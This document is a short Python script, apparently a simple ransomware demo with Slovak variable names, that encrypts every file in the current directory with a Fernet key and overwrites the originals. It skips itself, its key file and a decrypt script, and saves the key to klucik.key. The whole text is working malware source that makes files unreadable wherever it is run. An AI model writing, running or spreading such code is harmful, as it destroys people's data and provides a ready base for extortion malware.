import os
from cryptography.fernet import Fernet

subory = []

for subor in os.listdir():
    if subor == "Ransomware.py" or subor == "klucik.key" or subor == "Ransomware_decrypt.py":
        continue
    if os.path.isfile(subor):
        subory.append(subor)

print(subory)

key = Fernet.generate_key()

with open("klucik.key", "wb") as klucik:
    klucik.write(key)

for subor in subory:
    with open(subor, "rb") as klucikjedna:
        contents = klucikjedna.read()
    contents_encypted = Fernet(key).encrypt(contents)
    with open(subor, "wb") as klucikjedna:
        klucikjedna.write(contents_encypted)
